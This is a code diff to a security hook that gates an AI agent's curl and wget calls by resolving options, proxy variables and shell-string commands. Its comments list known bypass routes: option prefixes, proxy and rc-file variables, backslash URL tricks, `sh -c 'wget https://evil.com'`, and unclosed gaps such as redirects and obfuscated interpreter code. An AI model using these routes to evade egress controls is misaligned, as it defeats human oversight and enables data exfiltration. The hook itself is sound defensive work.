@@ -21,7 +21,12 @@
 //   5. wget, read exactly like curl (1.): it left the deny list, because a name rule cannot let a
 //      vendor host through and every sanctioned release download was refused with it. curl https://
 //      left the deny list for the same reason, so for both verbs THIS hook is now the gate, on the
-//      main agent too (its own config dir only, never the owner's shared ~/.claude).
+//      main agent too (its own config dir only, never the owner's shared ~/.claude). Long options are
+//      resolved by prefix the way curl and wget do, an unknown or ambiguous one denies, a wget -e
+//      command outside a small allow list denies, and so does a proxy / rc-file variable assigned in
+//      a command that runs either verb (#1931 review);
+//   6. a command line given to a shell as a string (`bash -c '...'`, `sh -lc "..."`, `eval '...'`)
+//      gets the whole analysis, like a heredoc fed to a shell (4.).
 // The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
 // their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
 // FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
@@ -72,13 +77,18 @@
 //     whitespace splitting is modelled);
 //   - loop or command input that comes from a file, a process substitution or a pipe, not from a
 //     literal here-string / heredoc in the command;
-//   - a URL whose host is not literally in the command (the environment, a previous command, a curl
-//     config file, or a value computed at runtime by a command substitution);
+//   - a URL whose host is not literally in the command (a previous command, or a value computed at
+//     runtime by a command substitution);
+//   - an rc file written by an EARLIER call: ~/.wgetrc and ~/.curlrc are read by every wget / curl
+//     run and can set a proxy or extra URLs. Assigning WGETRC / CURL_HOME / HOME in the command is
+//     denied (5.), the default file itself is not checked;
+//   - a REDIRECT: wget follows one by default and curl with -L, to a host the command never names.
+//     The vendor host is trusted to that extent;
 //   - a network primitive given a bare host and port with no URL scheme (socket-level connects): the
 //     body scan finds destinations by URL scheme only;
 //   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
 //     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
-//   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig, wget ...).
+//   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
 // Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
@@ -481,29 +491,79 @@ export function liftSubstitutions(text) {
 // So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
 // connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
 // Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
-// never read as a destination. An unknown long option is assumed to take no value: if that is
-// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
+// never read as a destination.
+//
+// LONG OPTIONS ARE RESOLVED THE WAY THE PROGRAM RESOLVES THEM (#1931 review, 2026-10-13). Both curl
+// and wget accept any UNIQUE PREFIX of a long option (measured: curl 8.5.0 runs `--preprox`, wget
+// 1.21.4 runs `--input`), so an exact-name check let `--conf`, `--input` or `--exe` through. A word
+// is therefore resolved against the program's full option table: exact name first, else a unique
+// prefix. An unknown or ambiguous option DENIES -- the program itself refuses it, so the deny costs
+// nothing that would have worked, and a table that lags a newer release errs toward a deny.
+// The tables were MEASURED on the installed binaries, not copied from a man page: every name from
+// `curl --help all` and from getopt's own "ambiguous; possibilities" list for `wget --a` .. `--z`,
+// each run bare to see whether it "requires an argument" (that probe moved wget's --backups,
+// --report-speed and --restrict-file-names to the flags: they take no separate value, so the word
+// after them is a URL), plus curl's hidden aliases found by probing (buffer, krb4, ...). An option
+// some other build has and this table lacks is denied as unknown; that is the intended direction.
+// Hidden destination, FAIL CLOSED: curl -K/--config (a config file can set url / proxy) and
+// --alt-svc (a cache file that maps a host to another).
+export function resolveLongOption(word, table) {
+  if (table.has(word)) return word
+  const hits = [...table.keys()].filter((n) => n.startsWith(word))
+  return hits.length === 1 ? hits[0] : null
+}
+function optionTable(withValue, flags) {
+  return new Map([...withValue.map((n) => [n, true]), ...flags.map((n) => [n, false])])
+}
 const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
-const CURL_LONG_WITH_VALUE = new Set([
-  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
-  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
-  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
-  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
-  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
-  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
-  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
-  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
-  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
-  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
-  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
-  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
-  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
-  // destination-bearing: read below, still consumed as values
-  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
-  'doh-url', 'connect-to', 'resolve',
-])
-const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
+const CURL_LONG = optionTable([
+  'abstract-unix-socket', 'alt-svc', 'aws-sigv4', 'cacert', 'capath', 'cert', 'cert-type',
+  'ciphers', 'config', 'connect-timeout', 'connect-to', 'continue-at', 'cookie', 'cookie-jar',
+  'create-file-mode', 'crlfile', 'curves', 'data', 'data-ascii', 'data-binary', 'data-raw',
+  'data-urlencode', 'delegation', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr',
+  'dns-servers', 'doh-url', 'dump-header', 'egd-file', 'engine', 'etag-compare', 'etag-save',
+  'expect100-timeout', 'form', 'form-string', 'ftp-account', 'ftp-alternative-to-user',
+  'ftp-method', 'ftp-port', 'ftp-ssl-ccc-mode', 'happy-eyeballs-timeout-ms', 'haproxy-clientip',
+  'header', 'hostpubmd5', 'hostpubsha256', 'hsts', 'interface', 'ipfs-gateway', 'json',
+  'keepalive-time', 'key', 'key-type', 'krb', 'libcurl', 'limit-rate', 'local-port',
+  'login-options', 'mail-auth', 'mail-from', 'mail-rcpt', 'max-filesize', 'max-redirs',
+  'max-time', 'netrc-file', 'noproxy', 'oauth2-bearer', 'output', 'output-dir', 'parallel-max',
+  'pass', 'pinnedpubkey', 'preproxy', 'proto', 'proto-default', 'proto-redir', 'proxy',
+  'proxy1.0', 'proxy-cacert', 'proxy-capath', 'proxy-cert', 'proxy-cert-type', 'proxy-ciphers',
+  'proxy-crlfile', 'proxy-header', 'proxy-key', 'proxy-key-type', 'proxy-pass',
+  'proxy-pinnedpubkey', 'proxy-service-name', 'proxy-tls13-ciphers', 'proxy-tlsauthtype',
+  'proxy-tlspassword', 'proxy-tlsuser', 'proxy-user', 'pubkey', 'quote', 'random-file', 'range',
+  'rate', 'referer', 'request', 'request-target', 'resolve', 'retry', 'retry-delay',
+  'retry-max-time', 'sasl-authzid', 'service-name', 'socks4', 'socks4a', 'socks5',
+  'socks5-gssapi-service', 'socks5-hostname', 'speed-limit', 'speed-time', 'stderr',
+  'telnet-option', 'tftp-blksize', 'time-cond', 'tls13-ciphers', 'tlsauthtype', 'tls-max',
+  'tlspassword', 'tlsuser', 'trace', 'trace-ascii', 'trace-config', 'unix-socket', 'upload-file',
+  'url', 'url-query', 'user', 'user-agent', 'variable', 'write-out', 'krb4',], [
+  'anyauth', 'append', 'basic', 'ca-native', 'cert-status', 'compressed', 'compressed-ssh',
+  'create-dirs', 'crlf', 'digest', 'disable', 'disable-eprt', 'disable-epsv',
+  'disallow-username-in-url', 'doh-cert-status', 'doh-insecure', 'fail', 'fail-early',
+  'fail-with-body', 'false-start', 'form-escape', 'ftp-create-dirs', 'ftp-pasv', 'ftp-pret',
+  'ftp-skip-pasv-ip', 'ftp-ssl-ccc', 'ftp-ssl-control', 'get', 'globoff', 'haproxy-protocol',
+  'head', 'help', 'http0.9', 'http1.0', 'http1.1', 'http2', 'http2-prior-knowledge', 'http3',
+  'http3-only', 'ignore-content-length', 'include', 'insecure', 'ipv4', 'ipv6',
+  'junk-session-cookies', 'list-only', 'location', 'location-trusted', 'mail-rcpt-allowfails',
+  'manual', 'metalink', 'negotiate', 'netrc', 'netrc-optional', 'next', 'no-alpn', 'no-buffer',
+  'no-clobber', 'no-keepalive', 'no-npn', 'no-progress-meter', 'no-sessionid', 'ntlm', 'ntlm-wb',
+  'parallel', 'parallel-immediate', 'path-as-is', 'post301', 'post302', 'post303',
+  'progress-bar', 'proxy-anyauth', 'proxy-basic', 'proxy-ca-native', 'proxy-digest',
+  'proxy-http2', 'proxy-insecure', 'proxy-negotiate', 'proxy-ntlm', 'proxy-ssl-allow-beast',
+  'proxy-ssl-auto-client-cert', 'proxy-tlsv1', 'proxytunnel', 'raw', 'remote-header-name',
+  'remote-name', 'remote-name-all', 'remote-time', 'remove-on-error', 'retry-all-errors',
+  'retry-connrefused', 'sasl-ir', 'show-error', 'silent', 'socks5-basic', 'socks5-gssapi',
+  'socks5-gssapi-nec', 'ssl', 'ssl-allow-beast', 'ssl-auto-client-cert', 'ssl-no-revoke',
+  'ssl-reqd', 'ssl-revoke-best-effort', 'sslv2', 'sslv3', 'styled-output',
+  'suppress-connect-headers', 'tcp-fastopen', 'tcp-nodelay', 'tftp-no-options', 'tlsv1',
+  'tlsv1.0', 'tlsv1.1', 'tlsv1.2', 'tlsv1.3', 'trace-ids', 'trace-time', 'tr-encoding',
+  'use-ascii', 'verbose', 'version', 'xattr', 'buffer', 'keepalive', 'sessionid', 'alpn', 'npn',
+  'progress-meter', 'clobber', 'ftp-ssl', 'ftp-ssl-reqd', 'test-event',])
+const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'ipfs-gateway', 'x'])
 const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
+const CURL_HIDDEN_DEST = new Set(['K', 'config', 'alt-svc'])
 const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i
 
 // Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
@@ -517,7 +577,9 @@ export function shellWords(text) {
     if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
     if (c === '"') {
       let j = i + 1
-      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
+      // Inside double quotes bash drops a backslash only before $ ` " \ and a newline; before any
+      // other character it stays, and curl / wget receive it (`"https://evil.com\@host"`).
+      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length && /[$`"\\\n]/.test(text[j + 1])) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
       i = j + 1; continue
     }
     if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
@@ -526,44 +588,65 @@ export function shellWords(text) {
   push()
   return out
 }
-// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
-// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
-// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
-// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
-// too (`$PROTO://host`), so everything up to `://` is dropped.
+// The host of a curl / wget destination, scheme optional; null only when the HOST is not written in
+// the command (an unexpanded $VAR, an empty host such as a plain path, `-`). A variable in the PATH
+// does not hide the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a
+// known destination (an earlier `value.includes('$')` check let exactly that through). The scheme
+// may be a variable too (`$PROTO://host`), so everything up to `://` is dropped.
 export function destHost(value) {
   if (!value) return null
   const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
+  // A backslash in the authority is read differently by different URL parsers (WHATWG turns it into
+  // a `/`, so `evil.com\@vendor.com` would go to evil.com): the whole authority is the destination.
+  const authority = /^[^/?#]*/.exec(noScheme)[0]
+  if (authority.includes('\\')) return authority.toLowerCase()
   const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
   const h = m ? m[1].toLowerCase() : ''
   if (HOSTNAME.test(h)) return h
-  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
-  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
-  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
-  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
+  if (h === '' || h === '-' || h === '.' || h === '..' || h === '~' || h.includes('$')) return null
+  // Anything else written as the host is still a destination the program will try: a single label,
+  // 0x0a.0.0.1, 167772161, 10.1 -- and (#1931 review) a host that is not plain [a-z0-9.-] at all: a
+  // non-ASCII look-alike, a %-encoded name, a curl glob (`evil.{com,org}`). It can never equal a
+  // vendor entry, so returning it denies. Returning null here used to let all of them pass unread.
+  return h
 }
+// A long option word (without the leading `--`) resolved against a table, or null when the program
+// would refuse it. Exported for tests.
+export function longOption(word, table) {
+  const name = resolveLongOption(word, table)
+  return name === null ? null : { name, takesValue: table.get(name) }
+}
+export const UNKNOWN_OPTION = (prog, w) => `<${prog}: unknown or ambiguous option ${w}>`
+export const CURL_HIDDEN = '<curl: destination read from a config file>'
 // Every external destination host in a curl argv (the words AFTER `curl`).
 export function curlDestinations(args) {
   const dests = []
   const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
   const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
+  const judge = (name, v) => {
+    if (CURL_HIDDEN_DEST.has(name)) dests.push(CURL_HIDDEN)
+    else if (CURL_DEST_URL.has(name)) addUrl(v)
+    else if (CURL_DEST_PARTS.has(name)) addParts(v)
+  }
+  let positionalOnly = false
   for (let k = 0; k < args.length; k++) {
     const w = args[k]
     if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
-    if (w === '--' ) continue
+    if (positionalOnly) { addUrl(w); continue }
+    if (w === '--') { positionalOnly = true; continue } // after `--` every word is read as a URL
     if (w.startsWith('--')) {
-      const [name, inline] = w.slice(2).split(/=(.*)/s)
-      if (!CURL_LONG_WITH_VALUE.has(name)) continue
-      const v = inline !== undefined ? inline : args[++k]
-      if (CURL_DEST_URL.has(name)) addUrl(v)
-      else if (CURL_DEST_PARTS.has(name)) addParts(v)
+      // curl has no `--name=value` form: the whole word is the option name, so it resolves or not.
+      // `--no-NAME` switches a boolean off; on a value option curl refuses it.
+      let opt = longOption(w.slice(2), CURL_LONG)
+      if (!opt && w.startsWith('--no-') && CURL_LONG.get(w.slice(5)) === false) opt = { name: w.slice(5), takesValue: false }
+      if (!opt) { dests.push(UNKNOWN_OPTION('curl', w)); continue }
+      if (opt.takesValue) judge(opt.name, args[++k])
       continue
     }
     if (w.startsWith('-') && w.length > 1) {
       for (let q = 1; q < w.length; q++) {
         if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
-        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
-        if (CURL_DEST_URL.has(w[q])) addUrl(v)
+        judge(w[q], q + 1 < w.length ? w.slice(q + 1) : args[++k])
         break
       }
       continue
@@ -574,48 +657,91 @@ export function curlDestinations(args) {
 }
 // wget is judged exactly like curl: it is the same download verb, and the deny-list rule that used
 // to stop it (`wget *`) blocked every host, the vendor allowlist included, so a sanctioned release
-// download could not happen at all. A positional argument is a URL (no scheme -> http://), flags
-// that take a value are skipped with it (option list read from the wget 1.21 man page). Two shapes
-// hide the destination and FAIL CLOSED: -i/--input-file (URLs read from a file or stdin) and
-// --config (a wgetrc can set a proxy or a URL list). An -e/--execute command that sets a proxy names
-// that proxy as a destination. An unknown long option is assumed to take no value, as for curl.
-const WGET_SHORT_WITH_VALUE = new Set('eoaitOTwQUPlARDIXB'.split(''))
-const WGET_LONG_WITH_VALUE = new Set([
-  'execute', 'output-file', 'append-output', 'report-speed', 'input-file', 'input-metalink',
-  'metalink-index', 'base', 'config', 'rejected-log', 'bind-address', 'bind-dns-address',
-  'dns-servers', 'tries', 'output-document', 'backups', 'start-pos', 'progress', 'timeout',
-  'dns-timeout', 'connect-timeout', 'read-timeout', 'limit-rate', 'wait', 'waitretry', 'quota',
-  'restrict-file-names', 'prefer-family', 'user', 'password', 'use-askpass', 'local-encoding',
-  'remote-encoding', 'cut-dirs', 'directory-prefix', 'default-page', 'http-user', 'http-password',
-  'header', 'compression', 'max-redirect', 'proxy-user', 'proxy-password', 'referer', 'user-agent',
-  'post-data', 'post-file', 'method', 'body-data', 'body-file', 'retry-on-http-error',
-  'secure-protocol', 'certificate', 'certificate-type', 'private-key', 'private-key-type',
-  'ca-certificate', 'ca-directory', 'crl-file', 'pinnedpubkey', 'random-file', 'egd-file',
-  'hsts-file', 'warc-file', 'warc-header', 'warc-max-size', 'warc-dedup', 'warc-tempdir',
-  'ftp-user', 'ftp-password', 'level', 'accept', 'reject', 'domains', 'exclude-domains',
-  'follow-tags', 'ignore-tags', 'include-directories', 'exclude-directories', 'accept-regex',
-  'reject-regex', 'regex-type', 'load-cookies', 'save-cookies',
-])
+// download could not happen at all. A positional argument is a URL (no scheme -> http://), options
+// that take a value are skipped with it, long options resolved as above (getopt_long, `--name=value`
+// and `--name value` both). Shapes that hide the destination FAIL CLOSED: -i/--input-file and
+// --input-metalink (URLs read from a file or stdin), --config (a wgetrc can set a proxy or a URL
+// list), and every -e/--execute command outside WGET_EXECUTE_ALLOW (#1931 review): a wgetrc command
+// can do what a flag does (`input` is -i, `use_proxy` + `https_proxy` reroute the request), and its
+// name is matched by wget case-, `_`- and `-`-insensitively, so a deny list of spellings cannot hold.
+const WGET_SHORT_WITH_VALUE = new Set('aeilnotwABDIOPQRTUXY'.split(''))
+const WGET_LONG = optionTable([
+  'accept', 'accept-regex', 'append-output', 'base', 'bind-address', 'body-data', 'body-file',
+  'ca-certificate', 'ca-directory', 'certificate', 'certificate-type', 'ciphers', 'compression',
+  'config', 'connect-timeout', 'crl-file', 'cut-dirs', 'default-page', 'directory-prefix',
+  'dns-timeout', 'domains', 'dot-style', 'egd-file', 'exclude-directories', 'exclude-domains',
+  'execute', 'follow-tags', 'ftp-password', 'ftp-user', 'header', 'hsts-file', 'http-passwd',
+  'http-password', 'http-user', 'ignore-tags', 'include-directories', 'input-file', 'level',
+  'limit-rate', 'load-cookies', 'local-encoding', 'max-redirect', 'method', 'no',
+  'output-document', 'output-file', 'password', 'pinnedpubkey', 'post-data', 'post-file',
+  'prefer-family', 'private-key', 'private-key-type', 'progress', 'proxy__compat',
+  'proxy-passwd', 'proxy-password', 'proxy-user', 'quota', 'random-file', 'read-timeout',
+  'referer', 'regex-type', 'reject', 'rejected-log', 'reject-regex', 'remote-encoding',
+  'retry-on-http-error', 'save-cookies', 'secure-protocol', 'start-pos', 'timeout', 'tries',
+  'use-askpass', 'user', 'user-agent', 'wait', 'waitretry', 'warc-dedup', 'warc-file',
+  'warc-header', 'warc-max-size', 'warc-tempdir', 'input-metalink', 'metalink-index',
+  'preferred-location', 'bind-dns-address', 'dns-servers',], [
+  'adjust-extension', 'ask-password', 'auth-no-challenge', 'background', 'backup-converted',
+  'backups', 'cache', 'check-certificate', 'clobber', 'content-disposition', 'content-on-error',
+  'continue', 'convert-file-only', 'convert-links', 'cookies', 'debug', 'delete-after',
+  'directories', 'dns-cache', 'dont-remove-listing', 'follow-ftp', 'force-directories',
+  'force-html', 'ftps-clear-data-connection', 'ftps-fallback-to-ftp', 'ftps-implicit',
+  'ftps-resume-ssl', 'glob', 'help', 'host-directories', 'hsts', 'html-extension', 'htmlify',
+  'http-keep-alive', 'https-only', 'if-modified-since', 'ignore-case', 'ignore-length',
+  'inet4-only', 'inet6-only', 'iri', 'keep-badhash', 'keep-session-cookies', 'mirror', 'netrc',
+  'no-adjust-extension', 'no-ask-password', 'no-auth-no-challenge', 'no-background',
+  'no-backup-converted', 'no-backups', 'no-cache', 'no-check-certificate', 'no-clobber',
+  'no-config', 'no-content-disposition', 'no-content-on-error', 'no-continue',
+  'no-convert-file-only', 'no-convert-links', 'no-cookies', 'no-debug', 'no-delete-after',
+  'no-directories', 'no-dns-cache', 'no-follow-ftp', 'no-force-directories', 'no-force-html',
+  'no-ftps-clear-data-connection', 'no-ftps-fallback-to-ftp', 'no-ftps-implicit',
+  'no-ftps-resume-ssl', 'no-glob', 'no-host-directories', 'no-hsts', 'no-html-extension',
+  'no-htmlify', 'no-http-keep-alive', 'no-https-only', 'no-if-modified-since', 'no-ignore-case',
+  'no-ignore-length', 'no-inet4-only', 'no-inet6-only', 'no-iri', 'no-keep-badhash',
+  'no-keep-session-cookies', 'no-mirror', 'no-netrc', 'no-no-clobber', 'no-no-config',
+  'no-no-parent', 'no-page-requisites', 'no-parent', 'no-passive-ftp', 'no-preserve-permissions',
+  'no-protocol-directories', 'no-proxy', 'no-quiet', 'no-random-wait', 'no-recursive',
+  'no-relative', 'no-remove-listing', 'no-report-speed', 'no-restrict-file-names',
+  'no-retr-symlinks', 'no-retry-connrefused', 'no-retry-on-host-error', 'no-save-headers',
+  'no-server-response', 'no-show-progress', 'no-span-hosts', 'no-spider', 'no-strict-comments',
+  'no-timestamping', 'no-trust-server-names', 'no-unlink', 'no-use-server-timestamps',
+  'no-verbose', 'no-warc-cdx', 'no-warc-compression', 'no-warc-digests', 'no-warc-keep-log',
+  'no-xattr', 'page-requisites', 'parent', 'passive-ftp', 'preserve-permissions',
+  'protocol-directories', 'proxy', 'quiet', 'random-wait', 'recursive', 'relative',
+  'remove-listing', 'report-speed', 'restrict-file-names', 'retr-symlinks', 'retry-connrefused',
+  'retry-on-host-error', 'save-headers', 'server-response', 'show-progress', 'span-hosts',
+  'spider', 'strict-comments', 'timestamping', 'trust-server-names', 'unlink',
+  'use-server-timestamps', 'verbose', 'version', 'warc-cdx', 'warc-compression', 'warc-digests',
+  'warc-keep-log', 'xattr', 'metalink-over-http', 'no-metalink-over-http',])
 const WGET_HIDDEN_DEST = new Set(['i', 'input-file', 'input-metalink', 'config'])
 export const WGET_HIDDEN = '<wget: destination read from a file>'
+// The -e commands that only tune a transfer already aimed at the judged URL. Matched after wget's own
+// normalisation (lower case, `_` and `-` dropped), with a plain value; anything else denies.
+export const WGET_EXECUTE_ALLOW = new Set(['robots', 'tries', 'timeout', 'readtimeout', 'connecttimeout',
+  'dnstimeout', 'wait', 'waitretry', 'limitrate', 'verbose', 'quiet', 'progress', 'showprogress'])
+export function wgetExecuteAllowed(cmd) {
+  const m = /^\s*([A-Za-z0-9_-]+)\s*=\s*([A-Za-z0-9.:]*)\s*$/.exec(String(cmd ?? ''))
+  return !!m && WGET_EXECUTE_ALLOW.has(m[1].toLowerCase().replace(/[-_]/g, ''))
+}
 // Every external destination host in a wget argv (the words AFTER `wget`).
 export function wgetDestinations(args) {
   const dests = []
   const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
   const judgeValue = (name, v) => {
-    if (WGET_HIDDEN_DEST.has(name)) { dests.push(WGET_HIDDEN); return }
-    if ((name === 'e' || name === 'execute') && /^\s*(?:https?_|ftp_)?proxy\s*=/i.test(String(v ?? ''))) {
-      addUrl(String(v).replace(/^[^=]*=\s*/, ''))
-    }
+    if (WGET_HIDDEN_DEST.has(name)) dests.push(WGET_HIDDEN)
+    else if ((name === 'e' || name === 'execute') && !wgetExecuteAllowed(v)) dests.push(`<wget -e: ${String(v ?? '').trim()}>`)
   }
+  let positionalOnly = false
   for (let k = 0; k < args.length; k++) {
     const w = args[k]
     if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
-    if (w === '--') continue
+    if (positionalOnly) { addUrl(w); continue }
+    if (w === '--') { positionalOnly = true; continue }
     if (w.startsWith('--')) {
-      const [name, inline] = w.slice(2).split(/=(.*)/s)
-      if (!WGET_LONG_WITH_VALUE.has(name)) continue
-      judgeValue(name, inline !== undefined ? inline : args[++k])
+      const [word, inline] = w.slice(2).split(/=(.*)/s)
+      const opt = longOption(word, WGET_LONG)
+      if (!opt) { dests.push(UNKNOWN_OPTION('wget', w)); continue }
+      if (opt.takesValue) judgeValue(opt.name, inline !== undefined ? inline : args[++k])
       continue
     }
     if (w.startsWith('-') && w.length > 1) {
@@ -628,7 +754,7 @@ export function wgetDestinations(args) {
     }
     addUrl(w) // positional: always a URL to wget
   }
-  return dests.filter((h) => h === WGET_HIDDEN || !isLocalHost(h))
+  return dests.filter((h) => !isLocalHost(h))
 }
 // EGRESSHEREDOC924: STDIN FEEDS. A heredoc body or a here-string word is what the command on the
 // left reads from stdin. For an interpreter that stdin IS the program (`python3 - <<'PY'`,
@@ -724,6 +850,38 @@ function readValues(text, { names, array }) {
   }
   return out
 }
+// #1931 review: the ENVIRONMENT steers curl and wget without showing in their argv. A proxy variable
+// reroutes the request to the proxy host (curl reads [protocol]_PROXY / ALL_PROXY, wget the
+// lower-case http_proxy / https_proxy / ftp_proxy), and WGETRC, SYSTEM_WGETRC, CURL_HOME, HOME and
+// XDG_CONFIG_HOME pick the rc file, which can set a proxy or a URL list. So in a command that runs
+// curl or wget, an assignment to any of them denies: a prefix (`https_proxy=x curl`), `env X=...`,
+// `export X=...`, a plain assignment (it changes an already exported variable). It is read on the
+// MASKED text, so a quoted payload that merely mentions `https_proxy=` is not an assignment.
+// no_proxy only narrows the proxy use and is left alone. What this cannot see is said in the
+// header: an rc file (~/.wgetrc, ~/.curlrc) written by an EARLIER call.
+const ENV_REDIRECT = /(?:^|[\s;&|(!{])([A-Za-z0-9]+_proxy|WGETRC|SYSTEM_WGETRC|CURL_HOME|HOME|XDG_CONFIG_HOME)=/gi
+export function envRedirect(masked) {
+  for (const m of String(masked ?? '').matchAll(ENV_REDIRECT)) if (!/^no_proxy$/i.test(m[1])) return `${m[1]}=`
+  return null
+}
+// A command line handed to a shell as a STRING (`bash -c '...'`, `sh -lc "..."`, `eval '...'`) is a
+// command line of its own and gets the whole analysis, like a heredoc fed to a shell. Measured
+// 2026-10-13: until then the parser never looked inside it, and `sh -c 'wget https://evil.com'` passed.
+// Returns the body, or null when `cmd` is not such a shell call.
+export function shellCommandBody(cmd, text) {
+  const argv = shellWords(text)
+  const at = argv.findIndex((w) => w.split('/').pop() === cmd)
+  if (at === -1) return null
+  if (cmd === 'eval') return argv.slice(at + 1).join(' ')
+  if (!SHELL.test(cmd)) return null
+  for (let k = at + 1; k < argv.length; k++) {
+    const w = argv[k]
+    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(w)) return argv[k + 1] ?? null
+    if (!w.startsWith('-') && !w.startsWith('+')) return null
+    if (w === '-o' || w === '+o' || w === '-O' || w === '+O') k++
+  }
+  return null
+}
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
   const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
@@ -732,6 +890,10 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   }
   const masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
+  if (/\b(?:curl|wget)\b/.test(norm)) {
+    const redirect = envRedirect(masked)
+    if (redirect) return { deny: true, reason: 'env-redirect', hosts: [redirect] }
+  }
   const env = collectAssignments(orig, masked)
   const loops = collectLoops(orig, masked, env)
   const feeds = stdinFeeds(orig, masked, herestrings, env)
@@ -778,6 +940,11 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const variants = loopVariants(orig.slice(a, b), env, loops)
     for (const text of [plain, ...(variants ?? [])]) {
       const cmd = mw[i].split('/').pop()
+      const body = depth < 4 ? shellCommandBody(cmd, text) : null
+      if (body !== null) {
+        const r = classify(body, depth + 1, vendorHosts, vendorDomains)
+        if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
+      }
       let target = null
       if (cmd === 'curl') target = 'curl'
       else if (cmd === 'wget') target = 'wget'
